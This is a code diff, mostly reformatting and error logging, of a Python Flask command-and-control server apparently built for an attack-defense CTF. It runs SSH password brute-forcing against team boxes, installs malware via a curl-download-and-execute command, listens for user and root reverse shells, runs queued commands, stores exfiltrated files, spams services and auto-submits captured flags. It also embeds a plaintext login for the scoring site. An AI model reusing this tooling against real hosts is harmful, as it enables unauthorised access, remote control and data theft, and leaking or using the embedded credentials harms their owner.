@@ -14,7 +14,7 @@ from threading import Thread
 
 import paramiko
 import requests
-from flask import Flask, request, render_template, flash, redirect, url_for
+from flask import Flask, flash, redirect, render_template, request, url_for
 from flask_bootstrap import Bootstrap4
 from flask_sqlalchemy import SQLAlchemy
 
@@ -32,13 +32,15 @@ THREADS = []
 # Default settings
 DEFAULT_SUBNET = "172.16.T.B"
 DEFAULT_WHITELISTED_IPS = "127.0.0.1"
-DEFAULT_FLAG_REGEX = "NCX\{[^\{\}]{1,100}\}"
+DEFAULT_FLAG_REGEX = r"NCX\{[^\{\}]{1,100}\}"
 DEFAULT_FLAG_SUBMIT_CONNECT_SID = ""
 DEFAULT_FLAG_SUBMIT_RC_UID = ""
 DEFAULT_FLAG_SUBMIT_RC_TOKEN = ""
 DEFAULT_FLAG_SUBMIT_SESSION = ""
 DEFAULT_MALWARE_PATH = "malware_installer"
-DEFAULT_MALWARE_INSTALL = "curl -o installer http://CHANGE_ME/i && chmod +x installer && ./installer"
+DEFAULT_MALWARE_INSTALL = (
+    "curl -o installer http://CHANGE_ME/i && chmod +x installer && ./installer"
+)
 DEFAULT_MALWARE_REV_SHELL_PORT_USER = "445"
 DEFAULT_MALWARE_REV_SHELL_PORT_ROOT = "443"
 DEFAULT_STATUS_PWNED_TIMEOUT = "300"
@@ -66,39 +68,107 @@ def main():
     db.create_all()
 
     # Create default settings
-    add_setting("subnet", DEFAULT_SUBNET,
-                "Subnet teams are on, T should replace team number and B should replace box IP")
-    add_setting("whitelisted_ips", DEFAULT_WHITELISTED_IPS,
-                "IPs, separated by commas and no spaces, that are allowed to access admin site")
+    add_setting(
+        "subnet",
+        DEFAULT_SUBNET,
+        "Subnet teams are on, T should replace team number and B should replace box IP",
+    )
+    add_setting(
+        "whitelisted_ips",
+        DEFAULT_WHITELISTED_IPS,
+        "IPs, separated by commas and no spaces, that are allowed to access admin site",
+    )
     add_setting("flag_regex", DEFAULT_FLAG_REGEX, "Regex to search for flags with")
-    add_setting("flag_submit_connect.sid", DEFAULT_FLAG_SUBMIT_CONNECT_SID, "Flag submission connect.sid cookie")
-    add_setting("flag_submit_rc_uid", DEFAULT_FLAG_SUBMIT_RC_UID, "Flag submission rc_uid cookie")
-    add_setting("flag_submit_rc_token", DEFAULT_FLAG_SUBMIT_RC_TOKEN, "Flag submission rc_token cookie")
-    add_setting("flag_submit_session", DEFAULT_FLAG_SUBMIT_SESSION, "Flag submission session cookie")
+    add_setting(
+        "flag_submit_connect.sid",
+        DEFAULT_FLAG_SUBMIT_CONNECT_SID,
+        "Flag submission connect.sid cookie",
+    )
+    add_setting(
+        "flag_submit_rc_uid",
+        DEFAULT_FLAG_SUBMIT_RC_UID,
+        "Flag submission rc_uid cookie",
+    )
+    add_setting(
+        "flag_submit_rc_token",
+        DEFAULT_FLAG_SUBMIT_RC_TOKEN,
+        "Flag submission rc_token cookie",
+    )
+    add_setting(
+        "flag_submit_session",
+        DEFAULT_FLAG_SUBMIT_SESSION,
+        "Flag submission session cookie",
+    )
     add_setting("malware_path", DEFAULT_MALWARE_PATH, "Path to first stage of binary")
-    add_setting("malware_install", DEFAULT_MALWARE_INSTALL, "Command to install malware")
-    add_setting("malware_rev_shell_port_user", DEFAULT_MALWARE_REV_SHELL_PORT_USER,
-                "Port malware tries to connect to for user shell")
-    add_setting("malware_rev_shell_port_root", DEFAULT_MALWARE_REV_SHELL_PORT_ROOT,
-                "Port malware tries to connect to for root shell")
-    add_setting("status_pwned_timeout", DEFAULT_STATUS_PWNED_TIMEOUT,
-                "Timeout, in seconds, when to stop assuming box is pwned")
-    add_setting("status_flags_timeout", DEFAULT_STATUS_FLAGS_TIMEOUT,
-                "Timeout, in seconds, when to stop assuming box is getting flags")
-    add_setting("status_interval", DEFAULT_STATUS_INTERVAL, "Seconds to wait between each status check")
-    add_setting("run_scripts_interval", DEFAULT_RUN_SCRIPTS_INTERVAL, "Seconds to wait between running scripts")
-    add_setting("ssh_bruteforce_interval", DEFAULT_SSH_BRUTEFORCE_INTERVAL,
-                "Seconds to wait between each SSH bruteforce")
-    add_setting("ssh_bruteforce_timeout", DEFAULT_SSH_BRUTEFORCE_TIMEOUT,
-                "Seconds to wait for timeout during SSH bruteforce")
-    add_setting("spam_interval_min", DEFAULT_SPAM_INTERVAL_MIN, "Minimum seconds to wait between each spam")
-    add_setting("spam_interval_max", DEFAULT_SPAM_INTERVAL_MAX, "Maximum seconds to wait between each spam")
-    add_setting("spam_timeout", DEFAULT_SPAM_TIMEOUT, "Seconds to wait for timeout during spamming")
-    add_setting("spam_rand_file", DEFAULT_SPAM_RAND_FILE, "Path to file with random strings line by line")
+    add_setting(
+        "malware_install", DEFAULT_MALWARE_INSTALL, "Command to install malware"
+    )
+    add_setting(
+        "malware_rev_shell_port_user",
+        DEFAULT_MALWARE_REV_SHELL_PORT_USER,
+        "Port malware tries to connect to for user shell",
+    )
+    add_setting(
+        "malware_rev_shell_port_root",
+        DEFAULT_MALWARE_REV_SHELL_PORT_ROOT,
+        "Port malware tries to connect to for root shell",
+    )
+    add_setting(
+        "status_pwned_timeout",
+        DEFAULT_STATUS_PWNED_TIMEOUT,
+        "Timeout, in seconds, when to stop assuming box is pwned",
+    )
+    add_setting(
+        "status_flags_timeout",
+        DEFAULT_STATUS_FLAGS_TIMEOUT,
+        "Timeout, in seconds, when to stop assuming box is getting flags",
+    )
+    add_setting(
+        "status_interval",
+        DEFAULT_STATUS_INTERVAL,
+        "Seconds to wait between each status check",
+    )
+    add_setting(
+        "run_scripts_interval",
+        DEFAULT_RUN_SCRIPTS_INTERVAL,
+        "Seconds to wait between running scripts",
+    )
+    add_setting(
+        "ssh_bruteforce_interval",
+        DEFAULT_SSH_BRUTEFORCE_INTERVAL,
+        "Seconds to wait between each SSH bruteforce",
+    )
+    add_setting(
+        "ssh_bruteforce_timeout",
+        DEFAULT_SSH_BRUTEFORCE_TIMEOUT,
+        "Seconds to wait for timeout during SSH bruteforce",
+    )
+    add_setting(
+        "spam_interval_min",
+        DEFAULT_SPAM_INTERVAL_MIN,
+        "Minimum seconds to wait between each spam",
+    )
+    add_setting(
+        "spam_interval_max",
+        DEFAULT_SPAM_INTERVAL_MAX,
+        "Maximum seconds to wait between each spam",
+    )
+    add_setting(
+        "spam_timeout",
+        DEFAULT_SPAM_TIMEOUT,
+        "Seconds to wait for timeout during spamming",
+    )
+    add_setting(
+        "spam_rand_file",
+        DEFAULT_SPAM_RAND_FILE,
+        "Path to file with random strings line by line",
+    )
 
     # Run MSFRPC
     subprocess.call("pkill msfrpcd", shell=True)
-    subprocess.call(f"{os.path.join(MSF_DIR, 'msfrpcd')} -P {MSFRPC_PW} -S -a 127.0.0.1", shell=True)
+    subprocess.call(
+        f"{os.path.join(MSF_DIR, 'msfrpcd')} -P {MSFRPC_PW} -S -a 127.0.0.1", shell=True
+    )
 
     # Start threads
     THREADS.append(Thread(target=status, name="status"))
@@ -113,8 +183,6 @@ def main():
     # Start Flask
     app.run(port=PORT, debug=DEBUG, host="0.0.0.0")
 
-
-# <editor-fold desc="Admin Endpoints">
 
 # Catch all 404s and 405s
 @app.errorhandler(404)
@@ -135,12 +203,15 @@ def check_admin():
 
 @app.route("/admin", methods=["GET"])
 def admin_home():
-    return render_template("home.html", total_boxes=Box.query.count(),
-                           pwned_boxes=Box.query.filter_by(pwned=True).count(),
-                           pwned_boxes_root=Box.query.filter_by(pwned_root=True).count(),
-                           flag_boxes=Box.query.filter_by(flags=True).count(),
-                           flags_found=Flag.query.count(),
-                           flags_submitted=Flag.query.filter(Flag.submitted.isnot(None)).count())
+    return render_template(
+        "home.html",
+        total_boxes=Box.query.count(),
+        pwned_boxes=Box.query.filter_by(pwned=True).count(),
+        pwned_boxes_root=Box.query.filter_by(pwned_root=True).count(),
+        flag_boxes=Box.query.filter_by(flags=True).count(),
+        flags_found=Flag.query.count(),
+        flags_submitted=Flag.query.filter(Flag.submitted.isnot(None)).count(),
+    )
 
 
 @app.route("/admin/threads", methods=["GET"])
@@ -179,7 +250,12 @@ def admin_logs():
     else:
         num = int(num)
     if type:
-        logs = Log.query.filter_by(type=type).order_by(Log.datetime.desc()).limit(num).all()
+        logs = (
+            Log.query.filter_by(type=type)
+            .order_by(Log.datetime.desc())
+            .limit(num)
+            .all()
+        )
     else:
         type = "all"
         logs = Log.query.order_by(Log.datetime.desc()).limit(num).all()
@@ -190,7 +266,9 @@ def admin_logs():
     for d in distinct:
         types.append(d[0])
 
-    return render_template("logs.html", logs=logs, selected_type=type, types=types, num=num)
+    return render_template(
+        "logs.html", logs=logs, selected_type=type, types=types, num=num
+    )
 
 
 @app.route("/admin/settings", methods=["GET"])
@@ -273,7 +351,9 @@ def admin_teams_update():
 
 @app.route("/admin/services", methods=["GET"])
 def admin_services():
-    return render_template("services.html", services=Service.query.order_by(Service.ip).all())
+    return render_template(
+        "services.html", services=Service.query.order_by(Service.ip).all()
+    )
 
 
 @app.route("/admin/services/add", methods=["POST"])
@@ -335,18 +415,25 @@ def admin_services_update():
 
 @app.route("/admin/boxes", methods=["GET"])
 def admin_boxes():
-    return render_template("boxes.html", boxes=Box.query.order_by(Box.team_num, Box.service_ip).all(),
-                           subnet=half_subnet())
+    return render_template(
+        "boxes.html",
+        boxes=Box.query.order_by(Box.team_num, Box.service_ip).all(),
+        subnet=half_subnet(),
+    )
 
 
 @app.route("/admin/flags", methods=["GET"])
 def admin_flags():
-    return render_template("flags.html", flags=Flag.query.order_by(Flag.found.desc()).all(), subnet=half_subnet())
+    return render_template(
+        "flags.html",
+        flags=Flag.query.order_by(Flag.found.desc()).all(),
+        subnet=half_subnet(),
+    )
 
 
 @app.route("/admin/flags/submit", methods=["GET"])
 def admin_flags_submit():
-    flags = Flag.query.filter(Flag.submitted == None).all()
+    flags = Flag.query.filter(Flag.submitted.is_(None)).all()
     submit_flags(flags)
     flash("Flags submitted")
     log("admin", f"submitting un-submitted flags from {request.remote_addr}")
@@ -371,8 +458,11 @@ def admin_flags_mark():
 
 @app.route("/admin/exfils", methods=["GET"])
 def admin_exfils():
-    return render_template("exfils.html", exfils=ExfilData.query.order_by(ExfilData.found.desc()).all(),
-                           subnet=half_subnet())
+    return render_template(
+        "exfils.html",
+        exfils=ExfilData.query.order_by(ExfilData.found.desc()).all(),
+        subnet=half_subnet(),
+    )
 
 
 @app.route("/admin/exfils/view", methods=["GET"])
@@ -390,8 +480,12 @@ def admin_exfils_view():
 
 @app.route("/admin/scripts", methods=["GET"])
 def admin_scripts():
-    return render_template("scripts.html", scripts=Script.query.order_by(Script.id).all(),
-                           services=Service.query.order_by(Service.ip).all(), scripts_dir=SCRIPTS_DIR)
+    return render_template(
+        "scripts.html",
+        scripts=Script.query.order_by(Script.id).all(),
+        services=Service.query.order_by(Service.ip).all(),
+        scripts_dir=SCRIPTS_DIR,
+    )
 
 
 @app.route("/admin/scripts/add", methods=["POST"])
@@ -450,8 +544,11 @@ def admin_scripts_update():
 
 @app.route("/admin/flagrets", methods=["GET"])
 def admin_flagrets():
-    return render_template("flagrets.html", flagrets=FlagRetrieval.query.all(),
-                           services=Service.query.order_by(Service.ip).all())
+    return render_template(
+        "flagrets.html",
+        flagrets=FlagRetrieval.query.all(),
+        services=Service.query.order_by(Service.ip).all(),
+    )
 
 
 @app.route("/admin/flagrets/add", methods=["POST"])
@@ -510,8 +607,12 @@ def admin_flagrets_update():
 
 @app.route("/admin/commands", methods=["GET"])
 def admin_commands():
-    return render_template("commands.html", queued_commands=QueuedCommand.query.all(),
-                           boxes=Box.query.order_by(Box.team_num, Box.service_ip).all(), subnet=half_subnet())
+    return render_template(
+        "commands.html",
+        queued_commands=QueuedCommand.query.all(),
+        boxes=Box.query.order_by(Box.team_num, Box.service_ip).all(),
+        subnet=half_subnet(),
+    )
 
 
 @app.route("/admin/commands/add", methods=["POST"])
@@ -524,7 +625,9 @@ def admin_commands_add():
     # Parse box and add to database
     if box == "all":
         for box in Box.query.all():
-            db.session.add(QueuedCommand(box.team_num, box.service_ip, root_shell, command))
+            db.session.add(
+                QueuedCommand(box.team_num, box.service_ip, root_shell, command)
+            )
         db.session.commit()
     else:
         parts = box.split("-")
@@ -556,8 +659,11 @@ def admin_commands_delete():
 
 @app.route("/admin/ssh", methods=["GET"])
 def admin_ssh():
-    return render_template("ssh.html", usernames=SSHUsername.query.order_by(SSHUsername.username).all(),
-                           passwords=SSHPassword.query.order_by(SSHPassword.password).all())
+    return render_template(
+        "ssh.html",
+        usernames=SSHUsername.query.order_by(SSHUsername.username).all(),
+        passwords=SSHPassword.query.order_by(SSHPassword.password).all(),
+    )
 
 
 @app.route("/admin/ssh/usernames/add", methods=["POST"])
@@ -656,10 +762,6 @@ def admin_ssh_passwords_update():
     return redirect(url_for("admin_ssh"))
 
 
-# </editor-fold>
-
-# <editor-fold desc="Malware Endpoints">
-
 # Install route
 @app.route("/i", methods=["GET"])
 def install():
@@ -691,34 +793,41 @@ def exfil():
     # Decode data
     try:
         data = b64decode(b64_data).decode("utf-8")
-    except:
-        log("exfil_endpoint", f"b64 decode error on victimip {victimip} from {request.remote_addr}")
+    except Exception as e:
+        log(
+            "exfil_endpoint",
+            f"b64 decode error on victimip {victimip} from {request.remote_addr}: {e}",
+        )
         return ""
 
     # Get team and service
     try:
         team = victimip.split(".")[2]
         service = victimip.split(".")[3]
-    except:
-        log("exfil_endpoint", f"error decoding IP {victimip} from {request.remote_addr}")
+    except Exception as e:
+        log(
+            "exfil_endpoint",
+            f"error decoding IP {victimip} from {request.remote_addr}: {e}",
+        )
         return ""
 
     # Save the data and extract flags
     try:
         db.session.add(ExfilData(team, service, filename, data, datetime.now()))
         db.session.commit()
-    except:
-        log("exfil_endpoint",
-            f"error adding data for team {team} and service {service} for file {filename} from {request.remote_addr}")
+    except Exception as e:
+        log(
+            "exfil_endpoint",
+            f"error adding data for team {team} and service {service} for file {filename} from {request.remote_addr}: {e}",
+        )
         return ""
     extract_flags(data, Box.query.get((team, service)), "exfil")
-    log("exfil_endpoint", f"saved data from team {team} and service {service} from {request.remote_addr}")
+    log(
+        "exfil_endpoint",
+        f"saved data from team {team} and service {service} from {request.remote_addr}",
+    )
     return ""
 
-
-# </editor-fold>
-
-# <editor-fold desc="Thread Functions">
 
 def status():
     # Continue checking
@@ -727,18 +836,18 @@ def status():
         # Get settings from database
         try:
             pwned_timeout = int(Setting.query.get("status_pwned_timeout").value)
-        except:
-            log("status", "Invalid status_pwned_timeout setting")
+        except Exception as e:
+            log("status", f"Invalid status_pwned_timeout setting: {e}")
             pwned_timeout = DEFAULT_STATUS_PWNED_TIMEOUT
         try:
             flags_timeout = int(Setting.query.get("status_flags_timeout").value)
-        except:
-            log("status", "Invalid status_flags_timeout setting")
+        except Exception as e:
+            log("status", f"Invalid status_flags_timeout setting: {e}")
             flags_timeout = DEFAULT_STATUS_FLAGS_TIMEOUT
         try:
             interval = int(Setting.query.get("status_interval").value)
-        except:
-            log("status", "Invalid status_interval setting")
+        except Exception as e:
+            log("status", f"Invalid status_interval setting: {e}")
             interval = DEFAULT_STATUS_INTERVAL
 
         # Get all boxes
@@ -751,7 +860,10 @@ def status():
             if box.pwned:
                 delta = box.last_update + timedelta(seconds=pwned_timeout)
                 if delta < datetime.now():
-                    log("status", f"box with team {box.team_num} and service {box.service_ip} no longer pwned")
+                    log(
+                        "status",
+                        f"box with team {box.team_num} and service {box.service_ip} no longer pwned",
+                    )
                     box.pwned = False
                     box.pwned_root = False
                     db.session.commit()
@@ -760,7 +872,10 @@ def status():
             if box.flags:
                 delta = box.last_flag + timedelta(seconds=flags_timeout)
                 if delta < datetime.now():
-                    log("status", f"box with team {box.team_num} and service {box.service_ip} no longer getting flags")
+                    log(
+                        "status",
+                        f"box with team {box.team_num} and service {box.service_ip} no longer getting flags",
+                    )
                     box.flags = False
                     db.session.commit()
 
@@ -773,8 +888,10 @@ def rev_shell_user_server():
     # Get settings from database
     try:
         port = int(Setting.query.get("malware_rev_shell_port_user").value)
-    except:
-        log("rev_shell_user_server", "Invalid malware_rev_shell_port_user setting")
+    except Exception as e:
+        log(
+            "rev_shell_user_server", f"Invalid malware_rev_shell_port_user setting: {e}"
+        )
         port = DEFAULT_MALWARE_REV_SHELL_PORT_USER
 
     # Start listening
@@ -786,7 +903,10 @@ def rev_shell_user_server():
     # Keep accepting connections
     while True:
         (client, (client_ip, client_port)) = s.accept()
-        log("rev_shell_user_server", f"new connection from {client_ip} on port {client_port}")
+        log(
+            "rev_shell_user_server",
+            f"new connection from {client_ip} on port {client_port}",
+        )
         Thread(target=new_rev_shell, args=[False, client, client_ip]).start()
 
 
@@ -794,8 +914,10 @@ def rev_shell_root_server():
     # Get settings from database
     try:
         port = int(Setting.query.get("malware_rev_shell_port_root").value)
-    except:
-        log("rev_shell_root_server", "Invalid malware_rev_shell_port_root setting")
+    except Exception as e:
+        log(
+            "rev_shell_root_server", f"Invalid malware_rev_shell_port_root setting: {e}"
+        )
         port = DEFAULT_MALWARE_REV_SHELL_PORT_ROOT
 
     # Start listening
@@ -807,7 +929,10 @@ def rev_shell_root_server():
     # Keep accepting connections
     while True:
         (client, (client_ip, client_port)) = s.accept()
-        log("rev_shell_root_server", f"new connection from {client_ip} on port {client_port}")
+        log(
+            "rev_shell_root_server",
+            f"new connection from {client_ip} on port {client_port}",
+        )
         Thread(target=new_rev_shell, args=[True, client, client_ip]).start()
 
 
@@ -839,18 +964,24 @@ def new_rev_shell(root_shell, client, ip):
 
     # Check for commands to run
     commands = []
-    for flag_retrievals in FlagRetrieval.query.filter_by(service_ip=service_ip, root_shell=False).all():
+    for flag_retrievals in FlagRetrieval.query.filter_by(
+        service_ip=service_ip, root_shell=False
+    ).all():
         commands.append(flag_retrievals.command)
-    for queued_command in QueuedCommand.query.filter_by(team_num=team_num, service_ip=service_ip,
-                                                        root_shell=False).all():
+    for queued_command in QueuedCommand.query.filter_by(
+        team_num=team_num, service_ip=service_ip, root_shell=False
+    ).all():
         commands.append(queued_command.command)
         db.session.delete(queued_command)
         db.session.commit()
     if root_shell:
-        for flag_retrievals in FlagRetrieval.query.filter_by(service_ip=service_ip, root_shell=True).all():
+        for flag_retrievals in FlagRetrieval.query.filter_by(
+            service_ip=service_ip, root_shell=True
+        ).all():
             commands.append(flag_retrievals.command)
-        for queued_command in QueuedCommand.query.filter_by(team_num=team_num, service_ip=service_ip,
-                                                            root_shell=True).all():
+        for queued_command in QueuedCommand.query.filter_by(
+            team_num=team_num, service_ip=service_ip, root_shell=True
+        ).all():
             commands.append(queued_command.command)
             db.session.delete(queued_command)
             db.session.commit()
@@ -883,8 +1014,8 @@ def run_scripts():
         subnet = Setting.query.get("subnet").value
         try:
             interval = int(Setting.query.get("run_scripts_interval").value)
-        except:
-            log("run_scripts", "Invalid run_scripts_interval setting")
+        except Exception as e:
+            log("run_scripts", f"Invalid run_scripts_interval setting: {e}")
             interval = DEFAULT_RUN_SCRIPTS_INTERVAL
 
         # Get all scripts
@@ -904,19 +1035,28 @@ def run_scripts():
 
             # Iterate over boxes
             for box in boxes:
-                if box.service_ip == script.service_ip and (script.target_pwned and not box.pwned):
+                if box.service_ip == script.service_ip and (
+                    script.target_pwned and not box.pwned
+                ):
 
                     # Run the script
                     ip = get_ip(subnet, box)
                     log("run_scripts", f"running script {script.path} against {ip}")
                     try:
-                        output = subprocess.check_output(f"'./{path}' {ip}", shell=True, stderr=subprocess.STDOUT)
+                        output = subprocess.check_output(
+                            f"'./{path}' {ip}", shell=True, stderr=subprocess.STDOUT
+                        )
                     except subprocess.CalledProcessError as e:
-                        log("run_scripts",
-                            f"script {script.path} against {ip} failed with '{e.output.decode('utf-8')}'")
+                        log(
+                            "run_scripts",
+                            f"script {script.path} against {ip} failed with '{e.output.decode('utf-8')}'",
+                        )
                         continue
                     output = output.decode("utf-8")
-                    log("run_scripts", f"script {script.path} against {ip} received '{output}'")
+                    log(
+                        "run_scripts",
+                        f"script {script.path} against {ip} received '{output}'",
+                    )
 
                     # Extract the flags
                     extract_flags(output, box, f"script {script.path}")
@@ -939,13 +1079,13 @@ def ssh_bruteforce():
         malware_install = Setting.query.get("malware_install").value
         try:
             interval = int(Setting.query.get("ssh_bruteforce_interval").value)
-        except:
-            log("ssh_bruteforce", "Invalid ssh_bruteforce_interval setting")
+        except Exception as e:
+            log("ssh_bruteforce", f"Invalid ssh_bruteforce_interval setting: {e}")
             interval = DEFAULT_SSH_BRUTEFORCE_INTERVAL
         try:
             timeout = int(Setting.query.get("ssh_bruteforce_timeout").value)
-        except:
-            log("ssh_bruteforce", "Invalid ssh_bruteforce_timeout setting")
+        except Exception as e:
+            log("ssh_bruteforce", f"Invalid ssh_bruteforce_timeout setting: {e}")
             timeout = DEFAULT_SSH_BRUTEFORCE_TIMEOUT
 
         # Get SSH usernames and passwords
@@ -966,20 +1106,32 @@ def ssh_bruteforce():
                 username = username.username
                 for password in passwords:
                     password = password.password
-                    log("ssh_bruteforce",
-                        f"trying {ip}:{box.service.ssh_port} with username {username} and password {password}")
+                    log(
+                        "ssh_bruteforce",
+                        f"trying {ip}:{box.service.ssh_port} with username {username} and password {password}",
+                    )
 
                     # Try to SSH
                     try:
                         client.connect(
-                            ip, port=box.service.ssh_port, username=username, password=password, timeout=timeout,
-                            banner_timeout=timeout, auth_timeout=timeout)
-                    except:
-                        log("ssh_bruteforce",
-                            f"failed to {ip}:{box.service.ssh_port} with username {username} and password {password}")
+                            ip,
+                            port=box.service.ssh_port,
+                            username=username,
+                            password=password,
+                            timeout=timeout,
+                            banner_timeout=timeout,
+                            auth_timeout=timeout,
+                        )
+                    except Exception as e:
+                        log(
+                            "ssh_bruteforce",
+                            f"failed to {ip}:{box.service.ssh_port} with username {username} and password {password}: {e}",
+                        )
                         continue
-                    log("ssh_bruteforce",
-                        f"success to {ip}:{box.service.ssh_port} with username {username} and password {password}")
+                    log(
+                        "ssh_bruteforce",
+                        f"success to {ip}:{box.service.ssh_port} with username {username} and password {password}",
+                    )
 
                     # Install malware
                     ssh_cmd(client, f"echo '{malware_install}' > thing.sh")
@@ -1002,18 +1154,18 @@ def spam():
         subnet = Setting.query.get("subnet").value
         try:
             interval_min = int(Setting.query.get("spam_interval_min").value)
-        except:
-            log("spam", "Invalid spam_interval_min setting")
+        except Exception as e:
+            log("spam", f"Invalid spam_interval_min setting: {e}")
             interval_min = DEFAULT_SPAM_INTERVAL_MIN
         try:
             interval_max = int(Setting.query.get("spam_interval_max").value)
-        except:
-            log("spam", "Invalid spam_interval_max setting")
+        except Exception as e:
+            log("spam", f"Invalid spam_interval_max setting: {e}")
             interval_max = DEFAULT_SPAM_INTERVAL_MAX
         try:
             timeout = int(Setting.query.get("spam_timeout").value)
-        except:
-            log("spam", "Invalid spam_timeout setting")
+        except Exception as e:
+            log("spam", f"Invalid spam_timeout setting: {e}")
             timeout = DEFAULT_SPAM_TIMEOUT
 
         # Load random strings
@@ -1052,8 +1204,8 @@ def spam():
                 for d in data:
                     s.send(d)
                 s.close()
-            except:
-                log("spam", f"failure on {ip}:{box.service.port}")
+            except Exception as e:
+                log("spam", f"failure on {ip}:{box.service.port}: {e}")
                 continue
 
         # Wait until next spam
@@ -1061,10 +1213,6 @@ def spam():
         log("spam", f"sleeping for {interval} seconds")
         time.sleep(interval)
 
-
-# </editor-fold>
-
-# <editor-fold desc="Helper Functions">
 
 def half_subnet():
     parts = Setting.query.get("subnet").value.split(".")
@@ -1084,14 +1232,18 @@ def extract_flags(data, box, source):
     new_flags = []
     for flag in flags:
         if not Flag.query.get(flag):
-            new_flag = Flag(flag, box.team_num, box.service_ip, source, datetime.now(), None)
+            new_flag = Flag(
+                flag, box.team_num, box.service_ip, source, datetime.now(), None
+            )
             new_flags.append(new_flag)
             db.session.add(new_flag)
             box.last_flag = datetime.now()
             box.flags = True
             db.session.commit()
-            log("extract_flags",
-                f"new flag {flag} added from team {box.team_num} and service {box.service_ip} from {source}")
+            log(
+                "extract_flags",
+                f"new flag {flag} added from team {box.team_num} and service {box.service_ip} from {source}",
+            )
 
     # Submit the flags
     submit_flags(new_flags)
@@ -1099,34 +1251,47 @@ def extract_flags(data, box, source):
 
 def submit_flags(flags):
     # Get settings from database
-    connect_sid = Setting.query.get("flag_submit_connect.sid").value
-    rc_uid = Setting.query.get("flag_submit_rc_uid").value
-    rc_token = Setting.query.get("flag_submit_rc_token").value
-    session = Setting.query.get("flag_submit_session").value
+    # connect_sid = Setting.query.get("flag_submit_connect.sid").value
+    # rc_uid = Setting.query.get("flag_submit_rc_uid").value
+    # rc_token = Setting.query.get("flag_submit_rc_token").value
+    # session = Setting.query.get("flag_submit_session").value
     host = "https://combat.ctf.ncx2019.com/challenges"
 
     # Login
     try:
         s = requests.session()
         nonce = s.get(host).text.split('csrf_nonce = "')[1].split('"')[0]
-        s.post(host + "login", data={"name": "sschulz", "password": "lololand78", "nonce": nonce})
+        s.post(
+            host + "login",
+            data={"name": "sschulz", "password": "lololand78", "nonce": nonce},
+        )
         nonce = s.get(host + "challenges").text.split('csrf_nonce = "')[1].split('"')[0]
-    except:
+    except Exception as e:
+        log("submit_flags", f"error getting nonce: {e}")
         return
 
     # Iterate over flags to submit
     for flag in flags:
         try:
-            data = json.loads(s.post(host + "api/v1/challenges/attempt", headers={"csrf-token": nonce},
-                                     json={"challenge_id": 1, "submission": flag.flag}).text)
-        except:
+            data = json.loads(
+                s.post(
+                    host + "api/v1/challenges/attempt",
+                    headers={"csrf-token": nonce},
+                    json={"challenge_id": 1, "submission": flag.flag},
+                ).text
+            )
+        except Exception as e:
+            log("submit_flags", f"failed to submit flag {flag.flag}: {e}")
             continue
         if "intercepted" in data["data"]["message"].lower():
             flag.submitted = datetime.now()
             db.session.commit()
             log("submit_flags", f"flag {flag.flag} successfully submitted")
         else:
-            log("submit_flags", f"failed to submit flag {flag.flag} because {data['data']['message']}")
+            log(
+                "submit_flags",
+                f"failed to submit flag {flag.flag} because {data['data']['message']}",
+            )
 
 
 def get_ip(subnet, box):
@@ -1166,7 +1331,9 @@ def log(type, message):
 
     # Write to log file
     with open(LOG_FILE, "a+") as f:
-        f.write(f"[{type}] [{datetime.now().strftime('%m/%d/%Y %H:%M:%S')}] {message}\n")
+        f.write(
+            f"[{type}] [{datetime.now().strftime('%m/%d/%Y %H:%M:%S')}] {message}\n"
+        )
 
 
 def str_to_bool(s):
@@ -1177,10 +1344,6 @@ def str_to_bool(s):
     else:
         return None
 
-
-# </editor-fold>
-
-# <editor-fold desc="Objects">
 
 class Log(db.Model):
     id = db.Column(db.Integer, primary_key=True)
@@ -1229,16 +1392,22 @@ class Service(db.Model):
 
 class Box(db.Model):
     team_num = db.Column(db.Integer, db.ForeignKey("team.num"), primary_key=True)
-    team = db.relationship(Team, backref=db.backref("boxes", cascade="all, delete-orphan"))
+    team = db.relationship(
+        Team, backref=db.backref("boxes", cascade="all, delete-orphan")
+    )
     service_ip = db.Column(db.Integer, db.ForeignKey("service.ip"), primary_key=True)
-    service = db.relationship(Service, backref=db.backref("boxes", cascade="all, delete-orphan"))
+    service = db.relationship(
+        Service, backref=db.backref("boxes", cascade="all, delete-orphan")
+    )
     pwned = db.Column(db.Boolean, nullable=False)
     pwned_root = db.Column(db.Boolean, nullable=False)
     last_update = db.Column(db.DateTime, nullable=True)
     flags = db.Column(db.Boolean, nullable=False)
     last_flag = db.Column(db.DateTime, nullable=True)
 
-    def __init__(self, team_num, service_ip, pwned, pwned_root, last_update, flags, last_flag):
+    def __init__(
+        self, team_num, service_ip, pwned, pwned_root, last_update, flags, last_flag
+    ):
         self.team_num = team_num
         self.service_ip = service_ip
         self.pwned = pwned
@@ -1251,9 +1420,13 @@ class Box(db.Model):
 class Flag(db.Model):
     flag = db.Column(db.Text, primary_key=True)
     team_num = db.Column(db.Integer, db.ForeignKey("team.num"), nullable=False)
-    team = db.relationship(Team, backref=db.backref("flags", cascade="all, delete-orphan"))
+    team = db.relationship(
+        Team, backref=db.backref("flags", cascade="all, delete-orphan")
+    )
     service_ip = db.Column(db.Integer, db.ForeignKey("service.ip"), nullable=False)
-    service = db.relationship(Service, backref=db.backref("flags", cascade="all, delete-orphan"))
+    service = db.relationship(
+        Service, backref=db.backref("flags", cascade="all, delete-orphan")
+    )
     source = db.Column(db.Text, nullable=False)
     found = db.Column(db.DateTime, nullable=False)
     submitted = db.Column(db.DateTime, nullable=True)
@@ -1270,9 +1443,13 @@ class Flag(db.Model):
 class ExfilData(db.Model):
     id = db.Column(db.Integer, primary_key=True)
     team_num = db.Column(db.Integer, db.ForeignKey("team.num"), nullable=False)
-    team = db.relationship(Team, backref=db.backref("exfil_data", cascade="all, delete-orphan"))
+    team = db.relationship(
+        Team, backref=db.backref("exfil_data", cascade="all, delete-orphan")
+    )
     service_ip = db.Column(db.Integer, db.ForeignKey("service.ip"), nullable=False)
-    service = db.relationship(Service, backref=db.backref("exfil_data", cascade="all, delete-orphan"))
+    service = db.relationship(
+        Service, backref=db.backref("exfil_data", cascade="all, delete-orphan")
+    )
     filename = db.Column(db.Text, nullable=False)
     data = db.Column(db.Text, nullable=False)
     found = db.Column(db.DateTime, nullable=False)
@@ -1288,7 +1465,9 @@ class ExfilData(db.Model):
 class Script(db.Model):
     id = db.Column(db.Integer, primary_key=True)
     service_ip = db.Column(db.Integer, db.ForeignKey("service.ip"), nullable=False)
-    service = db.relationship(Service, backref=db.backref("scripts", cascade="all, delete-orphan"))
+    service = db.relationship(
+        Service, backref=db.backref("scripts", cascade="all, delete-orphan")
+    )
     path = db.Column(db.Text, nullable=False)
     target_pwned = db.Column(db.Boolean, nullable=False)
 
@@ -1301,7 +1480,9 @@ class Script(db.Model):
 class FlagRetrieval(db.Model):
     id = db.Column(db.Integer, primary_key=True)
